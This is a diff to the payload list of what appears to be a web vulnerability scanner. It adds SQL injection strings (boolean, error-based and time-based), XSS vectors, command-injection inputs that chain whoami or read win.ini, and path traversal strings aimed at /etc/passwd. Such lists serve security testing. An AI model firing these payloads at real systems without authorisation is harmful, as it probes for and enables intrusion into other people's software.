@@ -1,17 +1,31 @@
-# SAFS-Scanner Payloads (Mixed)
-# Benign
+# --- Benign (基准) ---
 test_safe_1
 1
 0
-# SQLi
+
+# --- SQL Injection (报错与布尔盲注特征) ---
+'
+"
 ' OR 1=1 -- 
-' UNION SELECT 1,2,3 -- 
-admin' --
-# XSS
+" OR 1=1 -- 
+') OR ('1'='1
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- 
+' AND sleep(5) -- 
+
+# --- XSS (各种标签绕过) ---
 <script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-# CMDi
-; ls -la
-| cat /etc/passwd
-# Path Traversal
-../../../../etc/passwd
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+'"><script>alert(1)</script>
+javascript:alert(1)
+
+# --- Command Injection (多平台兼容) ---
+; whoami
+| whoami
+& whoami
+`whoami`
+|| type C:\Windows\win.ini
+
+# --- Path Traversal ---
+../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\windows\win.ini
